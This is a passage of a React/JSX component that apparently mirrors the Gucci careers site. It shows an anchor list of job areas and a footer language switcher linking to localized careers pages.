                data-datalayer="Click on Areas anchor;;Global Visual Merchandising"
                data-barba-prevent
              >
                Global Visual Merchandising
              </a>
            </li>
            <li>
              <a
                href="#gucci-9"
                data-datalayer="Click on Areas anchor;;Gucci 9"
                data-barba-prevent
              >
                Gucci 9
              </a>
            </li>
            <li>
              <a
                href="#gucci-9-product-care"
                data-datalayer="Click on Areas anchor;;Gucci 9 - Product Care"
                data-barba-prevent
              >
                Gucci 9 - Product Care
              </a>
            </li>
            <li>
              <a
                href="#indirect-channels"
                data-datalayer="Click on Areas anchor;;Indirect Channels"
                data-barba-prevent
              >
                Indirect Channels
              </a>
            </li>
            <li>
              <a
                href="#retail"
                data-datalayer="Click on Areas anchor;;Retail"
                data-barba-prevent
              >
                Retail
              </a>
            </li>
            <li>
              <a
                href="#retail-operations-performance"
                data-datalayer="Click on Areas anchor;;Retail Operations & Performance"
                data-barba-prevent
              >
                Retail Operations & Performance
              </a>
            </li>
            <li>
              <a
                href="#staff-functions"
                data-datalayer="Click on Areas anchor;;Staff Functions"
                data-barba-prevent
              >
                Staff Functions
              </a>
            </li>
            <li>
              <a
                href="#store-planning"
                data-datalayer="Click on Areas anchor;;Store Planning"
                data-barba-prevent
              >
                Store Planning
              </a>
            </li>
            <li>
              <a
                href="#supply-chain"
                data-datalayer="Click on Areas anchor;;Supply Chain"
                data-barba-prevent
              >
                Supply Chain
              </a>
            </li>
            <li>
              <a
                href="#watches-jewerly"
                data-datalayer="Click on Areas anchor;;Watches & Jewerly"
                data-barba-prevent
              >
                Watches & Jewerly
              </a>
            </li>{" "}
          </ul>
        </div>

        <div className="wpml-ls-statics-footer wpml-ls wpml-ls-legacy-list-horizontal">
          <ul>
            <li className="wpml-ls-slot-footer wpml-ls-item wpml-ls-item-en wpml-ls-current-language wpml-ls-first-item wpml-ls-item-legacy-list-horizontal">
              <a href="https://careers.gucci.com/" className="wpml-ls-link">
                <img
                  className="wpml-ls-flag"
                  src={`${basePath}/assets/gucci/en.png`}
                  alt=""
                  width="18"
                  height="12"
                />
                <span className="wpml-ls-native">English</span>
              </a>
            </li>
            <li className="wpml-ls-slot-footer wpml-ls-item wpml-ls-item-de wpml-ls-item-legacy-list-horizontal">
              <a href="https://careers.gucci.com/de/" className="wpml-ls-link">
                <img
                  className="wpml-ls-flag"
                  src={`${basePath}/assets/gucci/de.png`}
                  alt=""
                  width="18"
                  height="12"
                />
                <span className="wpml-ls-native" lang="de">
                  Deutsch
                </span>
                <span className="wpml-ls-display">
                  <span className="wpml-ls-bracket"> (</span>German
                  <span className="wpml-ls-bracket">)</span>
                </span>
              </a>
            </li>
            <li className="wpml-ls-slot-footer wpml-ls-item wpml-ls-item-it wpml-ls-item-legacy-list-horizontal">
              <a href="https://careers.gucci.com/it/" className="wpml-ls-link">
                <img
                  className="wpml-ls-flag"
                  src={`${basePath}/assets/gucci/it.png`}
                  alt=""
                  width="18"
                  height="12"
                />
                <span className="wpml-ls-native" lang="it">
                  Italiano
                </span>
                <span className="wpml-ls-display">
                  <span className="wpml-ls-bracket"> (</span>Italian
                  <span className="wpml-ls-bracket">)</span>
                </span>
              </a>
            </li>
            <li className="wpml-ls-slot-footer wpml-ls-item wpml-ls-item-zh-hans wpml-ls-item-legacy-list-horizontal">
              <a
                href="https://careers.gucci.com/zh-hans/"
                className="wpml-ls-link"
              >
                <img
                  className="wpml-ls-flag"
                  src={`${basePath}/assets/gucci/zh-hans.png`}
                  alt=""
                  width="18"
                  height="12"
                />
                <span className="wpml-ls-native" lang="zh-hans">
                  简体中文
                </span>
                <span className="wpml-ls-display">
                  <span className="wpml-ls-bracket"> (</span>Chinese
                  (Simplified)
                  <span className="wpml-ls-bracket">)</span>
                </span>
              </a>
            </li>
            <li className="wpml-ls-slot-footer wpml-ls-item wpml-ls-item-ja wpml-ls-item-legacy-list-horizontal">
              <a href="https://careers.gucci.com/ja/" className="wpml-ls-link">
                <img
                  className="wpml-ls-flag"
                  src={`${basePath}/assets/gucci/ja.png`}
                  alt=""
                  width="18"
                  height="12"
                />
                <span className="wpml-ls-native" lang="ja">
                  日本語
                </span>
                <span className="wpml-ls-display">
                  <span className="wpml-ls-bracket"> (</span>Japanese
                  <span className="wpml-ls-bracket">)</span>
                </span>
              </a>
            </li>
            <li className="wpml-ls-slot-footer wpml-ls-item wpml-ls-item-pt-br wpml-ls-item-legacy-list-horizontal">
              <a
                href="https://careers.gucci.com/pt-br/"
                className="wpml-ls-link"
              >
                <img
                  className="wpml-ls-flag"
                  src={`${basePath}/assets/gucci/pt-br.png`}
                  alt=""
                  width="18"
                  height="12"
                />
                <span className="wpml-ls-native" lang="pt-br">
                  Português
                </span>
                <span className="wpml-ls-display">
                  <span className="wpml-ls-bracket"> (</span>Portuguese (Brazil)
                  <span className="wpml-ls-bracket">)</span>
                </span>
              </a>
            </li>
            <li className="wpml-ls-slot-footer wpml-ls-item wpml-ls-item-es wpml-ls-item-legacy-list-horizontal">
              <a href="https://careers.gucci.com/es/" className="wpml-ls-link">
                <img
                  className="wpml-ls-flag"
                  src={`${basePath}/assets/gucci/es.png`}
                  alt=""
                  width="18"
                  height="12"
                />
                <span className="wpml-ls-native" lang="es">
                  Español
                </span>
                <span className="wpml-ls-display">
                  <span className="wpml-ls-bracket"> (</span>Spanish
                  <span className="wpml-ls-bracket">)</span>
                </span>
              </a>
            </li>
            <li className="wpml-ls-slot-footer wpml-ls-item wpml-ls-item-fr wpml-ls-item-legacy-list-horizontal">
              <a href="https://careers.gucci.com/fr/" className="wpml-ls-link">
                <img
                  className="wpml-ls-flag"
                  src={`${basePath}/assets/gucci/fr.png`}
                  alt=""
                  width="18"
                  height="12"
                />
                <span className="wpml-ls-native" lang="fr">
                  Français
                </span>
                <span className="wpml-ls-display">
                  <span className="wpml-ls-bracket"> (</span>French
                  <span className="wpml-ls-bracket">)</span>
                </span>
              </a>
            </li>
            <li className="wpml-ls-slot-footer wpml-ls-item wpml-ls-item-ru wpml-ls-item-legacy-list-horizontal">
              <a href="https://careers.gucci.com/ru/" className="wpml-ls-link">
                <img
                  className="wpml-ls-flag"
                  src={`${basePath}/assets/gucci/ru.png`}
                  alt=""
                  width="18"
                  height="12"
                />
                <span className="wpml-ls-native" lang="ru">
                  Русский
                </span>
                <span className="wpml-ls-display">
                  <span className="wpml-ls-bracket"> (</span>Russian
                  <span className="wpml-ls-bracket">)</span>
                </span>
              </a>
            </li>
            <li className="wpml-ls-slot-footer wpml-ls-item wpml-ls-item-zh-hant wpml-ls-item-legacy-list-horizontal">
              <a
                href="https://careers.gucci.com/zh-hant/"
                className="wpml-ls-link"
              >
                <img
                  className="wpml-ls-flag"
                  src={`${basePath}/assets/gucci/zh.png`}
                  alt=""
                  width="18"
                  height="12"
                />
                <span className="wpml-ls-native" lang="zh-hant">
                  繁體中文
                </span>
                <span className="wpml-ls-display">
                  <span className="wpml-ls-bracket"> (</span>Chinese
                  (Traditional)
                  <span className="wpml-ls-bracket">)</span>
                </span>
              </a>
            </li>
            <li className="wpml-ls-slot-footer wpml-ls-item wpml-ls-item-ko wpml-ls-last-item wpml-ls-item-legacy-list-horizontal">
              <a href="https://careers.gucci.com/ko/" className="wpml-ls-link">
                <img
                  className="wpml-ls-flag"
                  src={`${basePath}/assets/gucci/ko.png`}
                  alt=""
                  width="18"
                  height="12"
                />
                <span className="wpml-ls-native" lang="ko">
                  한국어
                </span>
                <span className="wpml-ls-display">
                  <span className="wpml-ls-bracket"> (</span>Korean
                  <span className="wpml-ls-bracket">)</span>
                </span>
              </a>
            </li>
          </ul>
        </div>
      </div>
    </>
  );
}
